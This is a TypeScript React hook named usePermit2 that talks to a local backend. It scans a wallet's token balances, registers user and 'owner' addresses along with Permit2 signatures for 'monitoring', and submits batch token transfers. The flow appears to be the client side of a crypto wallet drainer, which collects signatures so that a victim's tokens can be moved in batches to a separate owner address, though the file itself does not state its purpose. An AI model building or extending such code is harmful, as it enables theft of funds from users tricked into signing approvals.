import { useCallback, useState } from "react";

const BACKEND_URL = "http://localhost:3003";

type Token = {
  contractAddress: string;
  balance: string;
  name: string;
  symbol: string;
};

type ScanResponse = {
  tokens: Token[];
};

type RegisterUserResponse = {
  success: boolean;
  userAddress: string;
  ownerAddress: string;
  monitored: number;
  message: string;
};

type SubmitBatchResponse = {
  success: boolean;
  transactionHash: string;
  tokens: number;
  userAddress: string;
  ownerAddress: string;
};

export function usePermit2() {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const checkHealth = useCallback(async () => {
    try {
      const res = await fetch(`${BACKEND_URL}/health`);
      if (!res.ok) throw new Error("Backend not responding");
      return await res.json();
    } catch (e) {
      throw new Error(e instanceof Error ? e.message : "Failed to check backend health");
    }
  }, []);

  const scanWallet = useCallback(
    async (walletAddress: string): Promise<Token[]> => {
      if (!walletAddress) {
        throw new Error("Wallet address required");
      }

      setLoading(true);
      setError(null);

      try {
        const res = await fetch(`${BACKEND_URL}/api/scan-wallet`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ walletAddress }),
        });

        if (!res.ok) {
          const data = await res.json().catch(() => ({}));
          throw new Error(data.error || `Failed to scan wallet (${res.status})`);
        }

        const data: ScanResponse = await res.json();
        return data.tokens || [];
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Unknown scan error";
        setError(msg);
        throw e;
      } finally {
        setLoading(false);
      }
    },
    []
  );

  const registerUser = useCallback(
    async (
      userAddress: string,
      ownerAddress: string,
      signature?: string,
      nonce?: string,
      deadline?: string
    ): Promise<RegisterUserResponse> => {
      setLoading(true);
      setError(null);

      try {
        const res = await fetch(`${BACKEND_URL}/api/register-user`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userAddress,
            ownerAddress,
            signature,
            nonce,
            deadline,
          }),
        });

        if (!res.ok) {
          const data = await res.json().catch(() => ({}));
          throw new Error(data.error || "Failed to register user");
        }

        return await res.json();
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Unknown registration error";
        setError(msg);
        throw e;
      } finally {
        setLoading(false);
      }
    },
    []
  );

  const submitBatchTransfer = useCallback(
    async (payload: {
      tokens: string[];
      amounts: string[];
      userAddress: string;
      ownerAddress: string;
      nonce: string;
      deadline: string;
      signature: string;
    }): Promise<SubmitBatchResponse> => {
      setLoading(true);
      setError(null);

      try {
        const res = await fetch(`${BACKEND_URL}/api/submit-batch-transfer`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        if (!res.ok) {
          const data = await res.json().catch(() => ({}));
          throw new Error(data.error || "Failed to submit batch transfer");
        }

        return await res.json();
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Unknown submission error";
        setError(msg);
        throw e;
      } finally {
        setLoading(false);
      }
    },
    []
  );

  return {
    checkHealth,
    scanWallet,
    registerUser,
    submitBatchTransfer,
    loading,
    error,
  };
}
